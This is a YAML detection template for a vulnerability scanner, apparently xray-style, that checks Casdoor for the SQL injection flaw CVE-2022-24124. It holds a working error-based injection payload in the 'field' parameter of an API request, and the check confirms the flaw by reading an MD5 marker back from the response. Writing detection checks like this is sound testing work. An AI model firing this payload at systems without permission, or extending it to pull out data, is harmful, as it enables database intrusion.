name: yaml-poc-casbin-casdoor-sql_injection-CVE-2022-24124
binding: 87e586db-76e1-47ab-8bf8-c7f830deb313
detail:
    author: jiapeng.han
    links:
        - http://packetstormsecurity.com/files/166163/Casdoor-1.13.0-SQL-Injection.html
        - https://cxsecurity.com/issue/WLB-2022030009
        - https://github.com/casdoor/casdoor/compare/v1.13.0...v1.13.1
        - https://github.com/casdoor/casdoor/issues/439
        - https://github.com/casdoor/casdoor/pull/442
        - https://nvd.nist.gov/vuln/detail/CVE-2022-24124
        - https://packetstormsecurity.com/files/166163/Casdoor-1.13.0-SQL-Injection.html
        - https://www.cybersecurity-help.cz/vdb/SB2022030218
        - https://www.exploit-db.com/exploits/50792
    vulnerability:
        id: 6db91d61-68c4-41ef-99f2-0593ab54ee5d
        level: high
    warning: Harmless
transport: http
set:
    rStr0: randomLowercase(5)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,concat('-',md5('{{rStr0}}'),'-'),1)
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(substr(md5(rStr0), 6, 28))
expression: r0()
